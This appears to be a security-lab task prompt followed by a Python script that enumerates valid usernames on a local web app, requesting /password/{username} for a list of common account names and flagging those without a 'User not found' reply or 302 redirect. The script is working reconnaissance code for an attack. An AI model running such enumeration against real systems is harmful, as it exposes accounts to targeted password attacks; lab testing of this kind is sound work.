Test username enumeration at http://127.0.0.1:32948/password/{username} using common usernames.

Create a Python script to:
1. Define a list of common usernames: ['test', 'admin', 'root', 'guest', 'user', 'manager', 'support', 'operator', 'service', 'oracle', 'mysql', 'postgres', 'www-data', 'apache', 'nginx', 'tomcat', 'manager', 'webmaster', 'info', 'mail', 'john', 'jane', 'bob', 'alice', 'charlie', 'dave', 'administrator', 'system', 'moderator', 'owner', 'developer', 'dev', 'staging', 'prod', 'production', 'backup']

2. For each username, make a GET request to http://127.0.0.1:32948/password/{username}

3. Check the response for "User not found" text:
   - If response contains "User not found" → Username is INVALID (don't print)
   - If response does NOT contain "User not found" → Username is VALID (print as FINDING)

4. Also check for HTTP redirect (302) which indicates invalid user

5. Output the list of VALID usernames found

The script should clearly identify which usernames exist in the system.

import requests

# Target configuration
target_url = "http://127.0.0.1:32948"

# List of common usernames to test
usernames = [
    'test', 'admin', 'root', 'guest', 'user', 'manager', 'support', 
    'operator', 'service', 'oracle', 'mysql', 'postgres', 'www-data', 
    'apache', 'nginx', 'tomcat', 'webmaster', 'info', 'mail', 
    'john', 'jane', 'bob', 'alice', 'charlie', 'dave', 
    'administrator', 'system', 'moderator', 'owner', 'developer', 
    'dev', 'staging', 'prod', 'production', 'backup'
]

print(f"[*] Starting username enumeration against {target_url}")
print(f"[*] Testing {len(usernames)} common usernames...")
print()

valid_usernames = []

for username in usernames:
    url = f"{target_url}/password/{username}"
    
    try:
        response = requests.get(url, allow_redirects=False, timeout=10)
        
        # Check for indicators of invalid user
        is_invalid = False
        
        # Check for 302 redirect (redirects to error page for invalid users)
        if response.status_code == 302:
            is_invalid = True
        
        # Check response body for "User not found" text
        if "User not found" in response.text:
            is_invalid = True
        
        # If not invalid, username exists
        if not is_invalid:
            print(f"[+] VALID USERNAME FOUND: {username}")
            print(f"    Status: {response.status_code}")
            print(f"    Length: {len(response.text)} bytes")
            valid_usernames.append(username)
        else:
            print(f"[-] Invalid: {username} (Status: {response.status_code})")
            
    except requests.exceptions.RequestException as e:
        print(f"[!] Error testing {username}: {e}")

print()
print("=" * 50)
print("ENUMERATION RESULTS")
print("=" * 50)
print(f"[*] Total tested: {len(usernames)}")
print(f"[*] Valid usernames found: {len(valid_usernames)}")
print()

if valid_usernames:
    print("[+] VALID USERNAMES:")
    for user in valid_usernames:
        print(f"    - {user}")
else:
    print("[-] No valid usernames found")

